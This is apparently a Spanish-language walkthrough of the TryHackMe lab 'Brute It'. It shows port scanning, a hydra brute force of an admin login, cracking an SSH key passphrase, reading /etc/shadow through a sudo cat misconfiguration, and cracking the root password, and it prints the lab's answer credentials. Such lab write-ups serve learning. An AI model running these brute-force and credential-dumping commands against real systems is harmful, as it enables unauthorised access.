# Brute it
## 1. Introducción
### 1.1 Antecedentes
**Brute It** es una máquina Linux de dificultad _Easy_ en la plataforma **TryHackMe**.  
El objetivo es comprometer el sistema mediante técnicas de **fuerza bruta**, enumeración de servicios web y posterior **escalada de privilegios** hasta obtener acceso como **root**.
### 1.2 Objetivos

- Enumerar servicios expuestos.
- Obtener acceso inicial mediante credenciales.
- Escalar privilegios a root.

---
## 2. Enumeración
### 2.1 Reconocimiento inicial
Verificamos conectividad:
```bash
ping -c1 bruteit.thm
```
El host responde correctamente.
### 2.2 Nmap
Escaneo completo de puertos:
```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 bruteit.thm -oN allports --open
```
Puertos abiertos relevantes:

- 22 → SSH
- 80 → HTTP

Escaneo detallado:
```bash
nmap -p22,80 -sCV -Pn -oN targeted bruteit.thm
```
Servicios identificados:

- **SSH** → OpenSSH
- **HTTP** → Apache
### 2.3 Enumeración Web
Accedemos al sitio web:
```url
http://bruteit.thm
```
Se observa una página con un panel de login en:
```
/admin
```
### 2.4 Fuerza bruta (Login)
El panel no muestra errores visibles al fallar login, por lo que se realiza un ataque de fuerza bruta.

Uso de hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz MACHINE_IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

Se obtienen credenciales válidas:
```
admin:xavier
```
---
## 3. Explotación
### 3.1 Acceso al panel

Se inicia sesión en:
```
/admin
```
Dentro del panel se encuentra información sensible.
### 3.2 Obtención de clave SSH
Se descubre una clave privada SSH (`id_rsa`).
```bash
chmod 600 id_rsa
```
### 3.3 Acceso vía SSH
Intentamos conexión:
```bash
ssh john@bruteit.thm -i id_rsa
```
Se solicita passphrase → procedemos a crackearla.
### 3.4 Crackeo de passphrase
Usamos John the Ripper:
```bash
ssha2john id_rsa > hash.txt  
john --wordlist=/usr/share/wordlists/rockyou/rockyou.txt hash.txt
```
Resultado:
```
rockinroll
```
### 3.5 Acceso como usuario
```bash
ssh john@bruteit.thm -i id_rsa
```
Ingresamos passphrase:
```
rockinroll
```
Acceso exitoso como:
```
john
```
---
## 4. Escalada de privilegios
### 4.1 Enumeración sudo
```bash
sudo -l
```
Salida:
```bash
john ALL=NOPASSWD: /bin/cat
```
### 4.2 Lectura de archivos sensibles
Aprovechamos privilegio:
```bash
sudo cat /etc/shadow
```
Obtenemos hashes del sistema.
### 4.3 Crackeo de contraseñas
Guardamos en `shadow.txt` y usamos John the Ripper:
```bash
john --wordlist=/usr/share/wordlists/rockyou/rockyou.txt shadow.txt
```
Resultado:
```bash
root:football
```
### 4.4 Escalada a root
Probamos la contraseña:
```bash
su root
```
Password:
```
football
```
